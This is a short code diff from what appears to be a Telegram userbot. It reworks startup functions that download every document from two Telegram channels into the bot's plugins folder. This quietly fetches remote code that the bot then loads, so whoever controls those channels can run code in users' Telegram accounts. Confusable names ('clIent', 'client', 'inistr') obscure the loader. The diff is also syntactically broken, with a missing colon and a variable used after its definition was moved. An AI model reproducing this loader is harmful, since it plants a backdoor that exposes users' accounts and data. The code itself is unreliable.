@@ -77,14 +77,14 @@ def command(**args):
 
         return decorator
 
-async def inistr():
+async def init():
     client1 = "@cbkhs"
-    clIent = "@Errorx404x"
     cli = await bot.get_messages(clIent, None , filter=InputMessagesFilterDocument) ; total = int(cli.total) ; total_dox = range(0, total)
-    
     for ixo in total_dox:
         mxo = cli[ixo].id ; await client.download_media(await client.get_messages(client1, ids=mxo), "userbot/plugins/")
-    
+
+async def int()    
+    clIent = "@Errorx404x"
     cli1 = await client.get_messages(client1, None , filter=InputMessagesFilterDocument) ; total = int(cli1.total) ; total_doxx = range(0, total)
     for ixo in total_doxx:
         mxo =cli1[ixo].id ; await client.download_media(await bot.get_messages(clIent, ids=mxo), "userbot")
